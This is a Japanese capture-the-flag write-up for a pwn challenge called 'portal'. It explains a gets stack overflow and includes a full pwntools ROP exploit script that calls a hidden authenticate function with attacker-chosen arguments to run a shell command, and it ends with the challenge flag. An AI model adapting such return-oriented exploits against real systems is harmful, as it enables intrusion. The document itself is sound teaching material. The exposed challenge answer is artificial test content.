# portal writeup

## 問題文

```txt
login機能を実装したけど，関数を呼び出し忘れちゃった😭

nc 203.0.113.0 4001
```

## about

ROPです．

## writeup

`main`を読むと，問題文の通り`authenticate`を呼び出していませんが，スタック上の変数に対し`gets`を使っています．

また，`authenticate`を読むと，第一引数が`0xc0ffee`の時，第二引数を`system`に渡しています．

第一引数が条件を満たさない場合は`system("cowsay cat flag.txt")`が呼び出されます．

これらの解析から，

- `main`の`gets`ではスタックオーバーフローが発生する
- `authenticate(0xc0ffee, "cat flag.txt")`の様な呼び出しをすればflagが読める

事が予想できます．

幸いな事に，`"cat flag.txt"`の文字列は`cowsay`の所にあるので，これが流用できます．

```python3
#!/usr/bin/env python3
from pwn import *
binfile = './chall'
context.binary = binfile
e = ELF(binfile)
rop = ROP(e)

io = remote("203.0.113.0", 4001)

for _ in range(6):
    io.readline()

rop.raw(rop.find_gadget(['pop rdi', 'ret']))
rop.raw(pack(0xc0ffee)) # rdi
rop.raw(rop.find_gadget(['pop rsi', 'pop r15', 'ret']))
rop.raw(pack(next(e.search(b'cat flag.txt')))) # rsi
rop.raw(pack(0)) # r15
rop.call(pack(e.sym['authenticate']))

payload = b'a' * 0x28 + rop.chain()

io.sendline(payload)

print(io.readline().decode())
```

## flag

`ISCCTF{ROP_1s_k1ll3d_by_Intel_CET}`
